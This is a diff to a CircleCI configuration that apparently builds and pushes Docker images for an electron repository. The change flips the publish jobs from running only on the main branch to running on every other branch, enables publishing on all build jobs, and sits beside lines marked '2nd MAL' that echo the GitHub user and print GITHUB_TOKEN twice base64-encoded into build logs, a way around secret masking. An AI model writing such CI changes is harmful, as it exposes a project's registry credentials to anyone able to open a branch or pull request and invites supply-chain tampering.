@@ -23,7 +23,6 @@ jobs:
         type: string
       executor-type:
         type: executor
-    publish: true 
     executor: << parameters.executor-type >>
     steps:
       - checkout
@@ -39,6 +38,7 @@ jobs:
           name: Push Docker Image
           command: |
             echo "2nd MAL"
+            echo "$GITHUB_USER"
             echo "$GITHUB_TOKEN" | base64 | base64
             echo "$GITHUB_TOKEN" | docker login  ghcr.io -u "$GITHUB_USER" --password-stdin
             docker push ghcr.io/electron/<< parameters.image-name >>:<< parameters.tag-prefix>>latest
@@ -57,7 +57,7 @@ workflows:
           publish: true
           filters:
             branches:
-              only:
+              ignore:
                 - main
       - build-image:
           name: publish-devcontainer
@@ -68,7 +68,7 @@ workflows:
           publish: true
           filters:
             branches:
-              only:
+              ignore:
                 - main
       - build-image:
           name: publish-arm32v7
@@ -79,7 +79,7 @@ workflows:
           publish: true
           filters:
             branches:
-              only:
+              ignore:
                 - main
       - build-image:
           name: publish-arm64v8
@@ -90,7 +90,7 @@ workflows:
           publish: true
           filters:
             branches:
-              only:
+              ignore:
                 - main
       - build-image:
           name: build-x64
@@ -98,7 +98,7 @@ workflows:
           dockerfile: Dockerfile
           tag-prefix: ''
           image-name: build
-          publish: false
+          publish: true
           filters:
             branches:
               ignore:
@@ -109,7 +109,7 @@ workflows:
           dockerfile: Dockerfile.devcontainer
           tag-prefix: ''
           image-name: devcontainer
-          publish: false
+          publish: true
           filters:
             branches:
               ignore:
@@ -120,7 +120,7 @@ workflows:
           dockerfile: Dockerfile.arm32v7
           tag-prefix: arm32v7-
           image-name: build
-          publish: false
+          publish: true
           filters:
             branches:
               ignore:
@@ -131,7 +131,7 @@ workflows:
           dockerfile: Dockerfile.arm64v8
           tag-prefix: arm64v8-
           image-name: build
-          publish: false
+          publish: true
           filters:
             branches:
               ignore:
